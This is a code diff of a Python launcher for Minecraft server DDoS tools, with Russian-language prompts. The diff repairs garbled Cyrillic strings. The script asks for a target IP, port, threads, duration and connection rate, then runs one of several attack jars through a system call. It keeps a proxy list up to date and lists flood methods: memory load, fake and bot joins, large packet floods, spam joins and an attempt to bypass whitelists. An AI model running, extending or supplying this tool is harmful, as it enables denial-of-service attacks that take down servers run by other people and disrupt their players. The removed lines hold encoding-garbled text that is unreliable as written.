@@ -25,13 +25,13 @@ def clearcmd():
 def ddoson(*, ip:str, protocol:int, methods:str, second:int, cps:int):
 	s.system(f'java -jar {jar} {ip} {protocol} {methods} {second} {cps}')
 def McBot():
-	ip = input(f'ip РґР»СЏ DDoS >> ')
-	port = str(input(f'Р•СЃР»Рё РїРѕСЂС‚ РЅРµ СѓРєР°Р·Р°РЅ РЅР°РїРёС€РёС‚Рµ None >> '))
+	ip = input(f'ip для DDoS >> ')
+	port = str(input(f'Если порт не указан напишите None >> '))
 	if port == 'None':
 		port = 25565
 	else:
 		port = int(port)
-	thre = input(f'РЎРєРѕР»СЊРєРѕ РїРѕС‚РѕРєРѕРІ РёСЃРїРѕР»СЊР·РѕРІР°С‚СЊ >> ')
+	thre = input(f'Сколько потоков использовать >> ')
 	s.system(f'java -jar {jar} {ip} {port} {thre}')
 def fixprint(text):
 	print(f'{text}')
@@ -47,11 +47,11 @@ def updateproxy():
 			file.write(f'{saveproxy}\n{get.text}')
 			file.close()
 
-    #print(f'РїСЂРѕРєСЃРё Р±С‹Р»Рё РѕР±РЅРѕРІР»РµРЅС‹')
+    #print(f'прокси были обновлены')
 if __name__ == '__main__':
 	fun.updateproxy()
 	print('1. MCBOT \n2. KingDoS \n3. McStorm \n4. botter \n5. Raffic')
-	jarinput = str(input(f'РљР°РєРѕР№ jar С„Р°Р№Р» С…РѕС‡РµС‚Рµ РёСЃРїРѕР»СЊР·РѕРІР°С‚СЊ >> '))
+	jarinput = str(input(f'Какой jar файл хочете использовать >> '))
 	if jarinput == '1':
 		name=name1
 		jar = jar1
@@ -68,37 +68,37 @@ if __name__ == '__main__':
 		name=name5
 		jar = jar5
 	while jarinput != '1':
-		print(f'Р’С‹ РёСЃРїРѕР»СЊР·СѓР№С‚Рµ {name}')
-		z = input('Р”Р»СЏ ddos РїСЂРѕРїРёС€РёС‚Рµ start\nР•СЃР»Рё С…РѕС‚РёС‚Рµ РїРѕСЃРјРѕС‚СЂРµС‚СЊ РїСЂРѕС‚РѕРєРѕР»С‹ protocol,methods РґР»СЏ РјРµС‚РѕРґРѕРІ\nР”Р»СЏ СЃРјРµРЅС‹ РЅР°РїРёС€РёС‚Рµ switch\nР’РµРґРёС‚Рµ С‡С‚Рѕ РІР°Рј РЅР°РґРѕ >> ')
+		print(f'Вы используйте {name}')
+		z = input('Для ddos пропишите start\nЕсли хотите посмотреть протоколы protocol,methods для методов\nДля смены напишите switch\nВедите что вам надо >> ')
 		if z != command:
-			print(f'РЇ РЅРµ РїРѕРЅРµР» РІР°С€Сѓ РєРѕРјРјР°РЅРґСѓ')
+			print(f'Я не понел вашу комманду')
 		if z == 'start':
-			ip = input('ip РґР»СЏ DDoS >> ')
-			protocol = input('protocol РґР»СЏ DDoS >> ')
-			methods = input('methods РґР»СЏ DDoS >> ')
-			second = input('second РґР»СЏ DDoS >> ')
-			cps = input('cps РґР»СЏ DDoS >> ')
+			ip = input('ip для DDoS >> ')
+			protocol = input('protocol для DDoS >> ')
+			methods = input('methods для DDoS >> ')
+			second = input('second для DDoS >> ')
+			cps = input('cps для DDoS >> ')
 			ddoson(ip=ip,protocol=protocol,methods=methods,second=second,cps=cps)
 		if z == 'protocol':
 			print(f'1.18.2: 758, 1.18.1: 757, 1.18: 757, \n 1.17.1: 756, 1.16.5: 754, 1.16.3: 753,\n 1.16.2: 751, 1.16.1: 736, 1.16: 735,\n 1.15.2: 578, 1.15.1: 575, 1.15: 573,\n 1.14.4: 498, 1.14.3: 490, 1.14.2: 485,\n 1.14.1: 480, 1.14: 477, 1.13.2: 404,\n 1.13.1: 401, 1.13: 393, 1.12.2: 340')
 		if z == 'methods':
-			print(f'ram - РЅР°РіСЂСѓР·РєР° РїР°РјРµС‚Рё')
-			print(f'join - Р·Р°С…РѕРґСЏС‚ С„РµР№Рє РёРіСЂРѕРєРё')
-			print(f'botjoiner - Р·Р°С…РѕРґСЏС‚ Р±РѕС‚С‹')
-			print(f'ping - Сѓ РёРіСЂРѕРєРѕРІ ping 0')
-			print(f'bigpacket - РјРЅРѕРіРѕ РїР°РєРµС‚РѕРІ')
-			print(f'nettydowner - РїС‹С‚Р°РµС‚СЃСЏ РїСЂРѕР±РёС‚СЊ whitelist РёР»Рё bungecord')
-			print(f'spamjoin - Р±РѕС‚С‹ Р·Р°С…РѕРґСЏС‚ РЅР° СЃРµСЂРІРµСЂ Рё РїРёС€СѓС‚ РІ С‡Р°С‚')
+			print(f'ram - нагрузка памети')
+			print(f'join - заходят фейк игроки')
+			print(f'botjoiner - заходят боты')
+			print(f'ping - у игроков ping 0')
+			print(f'bigpacket - много пакетов')
+			print(f'nettydowner - пытается пробить whitelist или bungecord')
+			print(f'spamjoin - боты заходят на сервер и пишут в чат')
 		if z == 'switch':
 			clearcmd()
-			print('Р’С‹Р·С‹РІР°СЋ СЂРµР¶РёРј РїРµСЂРµРєР»СЋС‡РµРЅРёРµ')
+			print('Вызываю режим переключение')
 			fun.switch()
 	while jarinput == '1':
-		print(f'Р’С‹ РёСЃРїРѕР»СЊР·СѓР№С‚Рµ {name}')
-		z = input('Р”Р»СЏ ddos РїСЂРѕРїРёС€РёС‚Рµ start >> ')
+		print(f'Вы используйте {name}')
+		z = input('Для ddos пропишите start >> ')
 		if z == 'start':
 			McBot()
 		if z == 'switch':
 			clearcmd()
-			print('Р’С‹Р·С‹РІР°СЋ СЂРµР¶РёРј РїРµСЂРµРєР»СЋС‡РµРЅРёРµ')
+			print('Вызываю режим переключение')
 			fun.switch()
